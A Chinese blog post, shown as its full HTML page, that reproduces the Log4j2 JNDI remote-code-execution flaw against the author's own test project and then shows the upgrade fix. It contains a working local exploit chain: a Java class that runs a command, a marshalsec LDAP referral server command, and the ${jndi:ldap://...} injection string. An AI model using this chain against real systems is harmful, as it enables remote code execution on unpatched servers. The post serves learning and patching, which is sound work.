<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Apache Log4j2 Jndi RCE 高危漏洞重现/修复 | ----.</title>
<meta name="keywords" content="">
<meta name="description" content="下面会分四步介绍 概述 1.目的 模拟攻击自有项目，了解原理，修复漏洞 2.漏洞概述 该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未">
<meta name="author" content="">
<link rel="canonical" href="https://naiba.fun/post/security/log4j2_cve-2021-44228-02/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.ac52e831626045dd65bc9b9c0d3d1031fde926ff3e7f90b5de5054fe6ed45136.css" integrity="sha256-rFLoMWJgRd1lvJucDT0QMf3pJv8&#43;f5C13lBU/m7UUTY=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://naiba.fun/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://naiba.fun/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://naiba.fun/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://naiba.fun/apple-touch-icon.png">
<link rel="mask-icon" href="https://naiba.fun/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Apache Log4j2 Jndi RCE 高危漏洞重现/修复" />
<meta property="og:description" content="下面会分四步介绍 概述 1.目的 模拟攻击自有项目，了解原理，修复漏洞 2.漏洞概述 该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://naiba.fun/post/security/log4j2_cve-2021-44228-02/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-12-26T01:14:25+08:00" />
<meta property="article:modified_time" content="2021-12-26T01:14:25+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Apache Log4j2 Jndi RCE 高危漏洞重现/修复"/>
<meta name="twitter:description" content="下面会分四步介绍 概述 1.目的 模拟攻击自有项目，了解原理，修复漏洞 2.漏洞概述 该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://naiba.fun/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Apache Log4j2 Jndi RCE 高危漏洞重现/修复",
      "item": "https://naiba.fun/post/security/log4j2_cve-2021-44228-02/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Apache Log4j2 Jndi RCE 高危漏洞重现/修复",
  "name": "Apache Log4j2 Jndi RCE 高危漏洞重现\/修复",
  "description": "下面会分四步介绍 概述 1.目的 模拟攻击自有项目，了解原理，修复漏洞 2.漏洞概述 该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未",
  "keywords": [
    
  ],
  "articleBody": "下面会分四步介绍 概述 1.目的 模拟攻击自有项目，了解原理，修复漏洞 2.漏洞概述 该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未经身份验证的攻击者通过发送特定恶意数据包，可在目标服务器上执行任意代码。 3.影响范围 Apache Log4j 2.x \u003c= 2.15.0-rc1 4.流程图 图片中用rmi方式,我是用的ldap。 重现漏洞 1.环境版本 JDK：1.8.0_241 Maven：3.6.3 log4j2：2.14.1 2.代码实现 按照流程图标识顺序开始编写代码 第一步、完成恶意代码的编写,部署到服务器上 public class Exploit { public Exploit() { try { System.out.println(\"进来了！进来了！\"); // 要执行的命令 打开计算器 // mac String[] commands = {\"open\", \"/System/Applications/Calculator.app\"}; //windows // Runtime.getRuntime().exec(\"calc.exe\"); Process pc = Runtime.getRuntime().exec(commands); pc.waitFor(); } catch (Exception e) { e.printStackTrace(); } } public static void main(String[] argv) { Exploit e = new Exploit(); } } 编译 Exploit.java 测试脚本 执行java Exploit 确保能成功打开计算器\n#进入Exploit.class所在目录,执行命令启动一个web服务 python3 -m http.server 8100 直接访问 http://127.0.0.1:8100/ 确保点击能把class下载下来\n第二部、搭建一个LDAP服务 这里会用到marshalsec反序列化工具 我已经打包好可以直接点击下载使用\n或者直接github上下载源码https://github.com/mbechler/marshalsec\n#进入marshalsec 然后执行打包命令 mvn clean package -DskipTests #执行命令启动服务 ldap默认端口是1389 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8100/#Exploit\" 第三部、编写含有log4j2的error输出接口(即被攻击者的接口，其实就是我们自己项目中含有error输出的接口) 这里我就直接在项目里面输出error日志了\npublic static void main(String[] args){ Logger logger = LogManager.getLogger(ExploitTest.class); // 根据自己版本，觉得是否取消注释下面这行代码, //因为JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 // 那么是不是升级jdk版本就能避免这个问题了呢，其实不然，有其他方式可以绕过高版本JKD，进行注入攻击 // 这里演示的是最基础的方式，所以需要先把变量设为true， //System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\"); logger.error(\"${jndi:ldap://127.0.0.1:1389/test}\"); } 如果提示这个错误，也是需要设置System.setProperty(“com.sun.jndi.ldap.object.trustURLCodebase”,“true”)的 那么现在执行这个main方式是不是会打开计算器了，成功被注入\n修复 根据官方提示升级即可 Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later). 如果是springboot 第一种最简单的方式，就是在pom中指定版本号\n\u003cproperties\u003e \u003clog4j2.version\u003e2.17.0\u003c/log4j2.version\u003e \u003c/properties\u003e ReImpot后应该能看到已经升级到了2.17.0了 第二种就是直接引入对应的jar包\n\u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-api\u003c/artifactId\u003e \u003cversion\u003e2.17.0\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-slf4j-impl\u003c/artifactId\u003e \u003cversion\u003e2.17.0\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-core\u003c/artifactId\u003e \u003cversion\u003e2.17.0\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-jul\u003c/artifactId\u003e \u003cversion\u003e2.17.0\u003c/version\u003e \u003c/dependency\u003e ",
  "wordCount" : "1152",
  "inLanguage": "zh",
  "datePublished": "2021-12-26T01:14:25+08:00",
  "dateModified": "2021-12-26T01:14:25+08:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://naiba.fun/post/security/log4j2_cve-2021-44228-02/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "----.",
    "logo": {
      "@type": "ImageObject",
      "url": "https://naiba.fun/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://naiba.fun" accesskey="h" title="----. (Alt + H)">----.</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://naiba.fun/" title="首页">
                    <span>首页</span>
                </a>
            </li>
            <li>
                <a href="https://naiba.fun/categories/" title="分类">
                    <span>分类</span>
                </a>
            </li>
            <li>
                <a href="https://naiba.fun/archives/" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="https://naiba.fun/search/" title="搜索 (Alt &#43; /)" accesskey=/>
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="https://naiba.fun/about/" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Apache Log4j2 Jndi RCE 高危漏洞重现/修复
    </h1>
    <div class="post-meta"><span title='2021-12-26 01:14:25 +0800 CST'>十二月 26, 2021</span>&nbsp;·&nbsp;3 分钟

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#%e4%b8%8b%e9%9d%a2%e4%bc%9a%e5%88%86%e5%9b%9b%e6%ad%a5%e4%bb%8b%e7%bb%8d" aria-label="下面会分四步介绍">下面会分四步介绍</a><ul>
                        
                <li>
                    <a href="#%e6%a6%82%e8%bf%b0" aria-label="概述">概述</a><ul>
                        
                <li>
                    <a href="#1%e7%9b%ae%e7%9a%84" aria-label="1.目的">1.目的</a></li>
                <li>
                    <a href="#2%e6%bc%8f%e6%b4%9e%e6%a6%82%e8%bf%b0" aria-label="2.漏洞概述">2.漏洞概述</a></li>
                <li>
                    <a href="#3%e5%bd%b1%e5%93%8d%e8%8c%83%e5%9b%b4" aria-label="3.影响范围">3.影响范围</a></li>
                <li>
                    <a href="#4%e6%b5%81%e7%a8%8b%e5%9b%be" aria-label="4.流程图">4.流程图</a></li></ul>
                </li>
                <li>
                    <a href="#%e9%87%8d%e7%8e%b0%e6%bc%8f%e6%b4%9e" aria-label="重现漏洞">重现漏洞</a><ul>
                        
                <li>
                    <a href="#1%e7%8e%af%e5%a2%83%e7%89%88%e6%9c%ac" aria-label="1.环境版本">1.环境版本</a></li>
                <li>
                    <a href="#2%e4%bb%a3%e7%a0%81%e5%ae%9e%e7%8e%b0" aria-label="2.代码实现">2.代码实现</a><ul>
                        
                <li>
                    <a href="#%e7%ac%ac%e4%b8%80%e6%ad%a5%e5%ae%8c%e6%88%90%e6%81%b6%e6%84%8f%e4%bb%a3%e7%a0%81%e7%9a%84%e7%bc%96%e5%86%99%e9%83%a8%e7%bd%b2%e5%88%b0%e6%9c%8d%e5%8a%a1%e5%99%a8%e4%b8%8a" aria-label="第一步、完成恶意代码的编写,部署到服务器上">第一步、完成恶意代码的编写,部署到服务器上</a></li>
                <li>
                    <a href="#%e7%ac%ac%e4%ba%8c%e9%83%a8%e6%90%ad%e5%bb%ba%e4%b8%80%e4%b8%aaldap%e6%9c%8d%e5%8a%a1" aria-label="第二部、搭建一个LDAP服务">第二部、搭建一个LDAP服务</a></li>
                <li>
                    <a href="#%e7%ac%ac%e4%b8%89%e9%83%a8%e7%bc%96%e5%86%99%e5%90%ab%e6%9c%89log4j2%e7%9a%84error%e8%be%93%e5%87%ba%e6%8e%a5%e5%8f%a3%e5%8d%b3%e8%a2%ab%e6%94%bb%e5%87%bb%e8%80%85%e7%9a%84%e6%8e%a5%e5%8f%a3%e5%85%b6%e5%ae%9e%e5%b0%b1%e6%98%af%e6%88%91%e4%bb%ac%e8%87%aa%e5%b7%b1%e9%a1%b9%e7%9b%ae%e4%b8%ad%e5%90%ab%e6%9c%89error%e8%be%93%e5%87%ba%e7%9a%84%e6%8e%a5%e5%8f%a3" aria-label="第三部、编写含有log4j2的error输出接口(即被攻击者的接口，其实就是我们自己项目中含有error输出的接口)">第三部、编写含有log4j2的error输出接口(即被攻击者的接口，其实就是我们自己项目中含有error输出的接口)</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#%e4%bf%ae%e5%a4%8d" aria-label="修复">修复</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="下面会分四步介绍">下面会分四步介绍<a hidden class="anchor" aria-hidden="true" href="#下面会分四步介绍">#</a></h1>
<h2 id="概述">概述<a hidden class="anchor" aria-hidden="true" href="#概述">#</a></h2>
<h3 id="1目的">1.目的<a hidden class="anchor" aria-hidden="true" href="#1目的">#</a></h3>
<pre><code>模拟攻击自有项目，了解原理，修复漏洞
</code></pre>
<h3 id="2漏洞概述">2.漏洞概述<a hidden class="anchor" aria-hidden="true" href="#2漏洞概述">#</a></h3>
<pre><code>该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未经身份验证的攻击者通过发送特定恶意数据包，可在目标服务器上执行任意代码。
</code></pre>
<h3 id="3影响范围">3.影响范围<a hidden class="anchor" aria-hidden="true" href="#3影响范围">#</a></h3>
<pre><code>Apache Log4j 2.x &lt;= 2.15.0-rc1
</code></pre>
<h3 id="4流程图">4.流程图<a hidden class="anchor" aria-hidden="true" href="#4流程图">#</a></h3>
<p>图片中用rmi方式,我是用的ldap。
<img loading="lazy" src="/images/22/Xnip2021-12-26_13-33-06.png" alt="图片转载自https://www.jianshu.com/p/f0a83136f89a侵删"  />
</p>
<h2 id="重现漏洞">重现漏洞<a hidden class="anchor" aria-hidden="true" href="#重现漏洞">#</a></h2>
<h3 id="1环境版本">1.环境版本<a hidden class="anchor" aria-hidden="true" href="#1环境版本">#</a></h3>
<pre><code>JDK：1.8.0_241
</code></pre>
<p><img loading="lazy" src="/images/22/20221226134857.jpg" alt="jdk1.8.0_241"  />

Maven：3.6.3
<img loading="lazy" src="/images/22/20221226134905.jpg" alt="maven"  />

log4j2：2.14.1
<img loading="lazy" src="/images/22/20221226135708.jpg" alt="log4j2"  />
</p>
<h3 id="2代码实现">2.代码实现<a hidden class="anchor" aria-hidden="true" href="#2代码实现">#</a></h3>
<pre><code>按照流程图标识顺序开始编写代码
</code></pre>
<h4 id="第一步完成恶意代码的编写部署到服务器上">第一步、完成恶意代码的编写,部署到服务器上<a hidden class="anchor" aria-hidden="true" href="#第一步完成恶意代码的编写部署到服务器上">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Java" data-lang="Java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exploit</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">Exploit</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;进来了！进来了！&#34;</span>);
</span></span><span style="display:flex;"><span>             <span style="color:#75715e">// 要执行的命令 打开计算器</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// mac</span>
</span></span><span style="display:flex;"><span>            String<span style="color:#f92672">[]</span> commands <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;open&#34;</span>, <span style="color:#e6db74">&#34;/System/Applications/Calculator.app&#34;</span>};
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//windows</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Runtime.getRuntime().exec(&#34;calc.exe&#34;);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            Process pc <span style="color:#f92672">=</span> Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(commands);
</span></span><span style="display:flex;"><span>            pc.<span style="color:#a6e22e">waitFor</span>();
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> argv) {
</span></span><span style="display:flex;"><span>        Exploit e <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Exploit();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>编译 Exploit.java
<img loading="lazy" src="/images/22/20221226143921.jpg" alt="javac Exploit.java"  />
</p>
<p>测试脚本
执行java Exploit <strong>确保能成功打开计算器</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span><span style="color:#75715e">#进入Exploit.class所在目录,执行命令启动一个web服务 </span>
</span></span><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">8100</span>
</span></span></code></pre></div><p><img loading="lazy" src="/images/22/4141679F-C473-41C5-A123-0F777BF74617.png" alt=""  />

直接访问 http://127.0.0.1:8100/ <strong>确保点击能把class下载下来</strong></p>
<h4 id="第二部搭建一个ldap服务">第二部、搭建一个LDAP服务<a hidden class="anchor" aria-hidden="true" href="#第二部搭建一个ldap服务">#</a></h4>
<p>这里会用到marshalsec反序列化工具
我已经打包好可以直接点击<a href="/data/marshalsec-0.0.3-SNAPSHOT-all.jar.zip">下载</a>使用</p>
<p>或者直接github上下载源码<a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span><span style="color:#75715e">#进入marshalsec 然后执行打包命令</span>
</span></span><span style="display:flex;"><span>mvn clean package -DskipTests
</span></span><span style="display:flex;"><span><span style="color:#75715e">#执行命令启动服务 ldap默认端口是1389</span>
</span></span><span style="display:flex;"><span>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span style="color:#e6db74">&#34;http://127.0.0.1:8100/#Exploit&#34;</span> 
</span></span></code></pre></div><h4 id="第三部编写含有log4j2的error输出接口即被攻击者的接口其实就是我们自己项目中含有error输出的接口">第三部、编写含有log4j2的error输出接口(即被攻击者的接口，其实就是我们自己项目中含有error输出的接口)<a hidden class="anchor" aria-hidden="true" href="#第三部编写含有log4j2的error输出接口即被攻击者的接口其实就是我们自己项目中含有error输出的接口">#</a></h4>
<p>这里我就直接在项目里面输出error日志了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Java" data-lang="Java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args){
</span></span><span style="display:flex;"><span>    Logger logger <span style="color:#f92672">=</span> LogManager.<span style="color:#a6e22e">getLogger</span>(ExploitTest.<span style="color:#a6e22e">class</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 根据自己版本，觉得是否取消注释下面这行代码,</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//因为JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 那么是不是升级jdk版本就能避免这个问题了呢，其实不然，有其他方式可以绕过高版本JKD，进行注入攻击</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 这里演示的是最基础的方式，所以需要先把变量设为true，</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//System.setProperty(&#34;com.sun.jndi.ldap.object.trustURLCodebase&#34;,&#34;true&#34;);</span>
</span></span><span style="display:flex;"><span>    logger.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;${jndi:ldap://127.0.0.1:1389/test}&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>如果提示这个错误，也是需要设置System.setProperty(&ldquo;com.sun.jndi.ldap.object.trustURLCodebase&rdquo;,&ldquo;true&rdquo;)的
<img loading="lazy" src="/images/22/20221226161327.jpg" alt="Reference Class Name: foo"  />
</p>
<p>那么现在执行这个main方式是不是会打开计算器了，成功被注入</p>
<h2 id="修复">修复<a hidden class="anchor" aria-hidden="true" href="#修复">#</a></h2>
<!-- raw HTML omitted -->
<p>根据官方提示升级即可
Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).
<a href="/images/22/20221227112957.jpg"><img loading="lazy" src="/images/22/20221227112957.jpg" alt=""  />
</a></p>
<p>如果是springboot
第一种最简单的方式，就是在pom中指定版本号</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Java" data-lang="Java"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>properties<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>log4j2.<span style="color:#a6e22e">version</span><span style="color:#f92672">&gt;</span>2.<span style="color:#a6e22e">17</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">&lt;/</span>log4j2.<span style="color:#a6e22e">version</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>properties<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>ReImpot后应该能看到已经升级到了2.17.0了
<img loading="lazy" src="/images/22/1640584754016.jpg" alt=""  />
</p>
<p>第二种就是直接引入对应的jar包</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Java" data-lang="Java"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>dependency<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>groupId<span style="color:#f92672">&gt;</span>org.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">logging</span>.<span style="color:#a6e22e">log4j</span><span style="color:#f92672">&lt;/</span>groupId<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>artifactId<span style="color:#f92672">&gt;</span>log4j<span style="color:#f92672">-</span>api<span style="color:#f92672">&lt;/</span>artifactId<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>version<span style="color:#f92672">&gt;</span>2.<span style="color:#a6e22e">17</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">&lt;/</span>version<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>dependency<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>dependency<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>groupId<span style="color:#f92672">&gt;</span>org.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">logging</span>.<span style="color:#a6e22e">log4j</span><span style="color:#f92672">&lt;/</span>groupId<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>artifactId<span style="color:#f92672">&gt;</span>log4j<span style="color:#f92672">-</span>slf4j<span style="color:#f92672">-</span>impl<span style="color:#f92672">&lt;/</span>artifactId<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>version<span style="color:#f92672">&gt;</span>2.<span style="color:#a6e22e">17</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">&lt;/</span>version<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>dependency<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>dependency<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>groupId<span style="color:#f92672">&gt;</span>org.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">logging</span>.<span style="color:#a6e22e">log4j</span><span style="color:#f92672">&lt;/</span>groupId<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>artifactId<span style="color:#f92672">&gt;</span>log4j<span style="color:#f92672">-</span>core<span style="color:#f92672">&lt;/</span>artifactId<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>version<span style="color:#f92672">&gt;</span>2.<span style="color:#a6e22e">17</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">&lt;/</span>version<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>dependency<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>dependency<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>groupId<span style="color:#f92672">&gt;</span>org.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">logging</span>.<span style="color:#a6e22e">log4j</span><span style="color:#f92672">&lt;/</span>groupId<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>artifactId<span style="color:#f92672">&gt;</span>log4j<span style="color:#f92672">-</span>jul<span style="color:#f92672">&lt;/</span>artifactId<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>version<span style="color:#f92672">&gt;</span>2.<span style="color:#a6e22e">17</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">&lt;/</span>version<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>dependency<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://naiba.fun/post/tips/idea-annotation/">
    <span class="title">« 上一页</span>
    <br>
    <span>Idea Annotation</span>
  </a>
  <a class="next" href="https://naiba.fun/post/mac/brew/">
    <span class="title">下一页 »</span>
    <br>
    <span>Brew安装</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://naiba.fun">----.</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
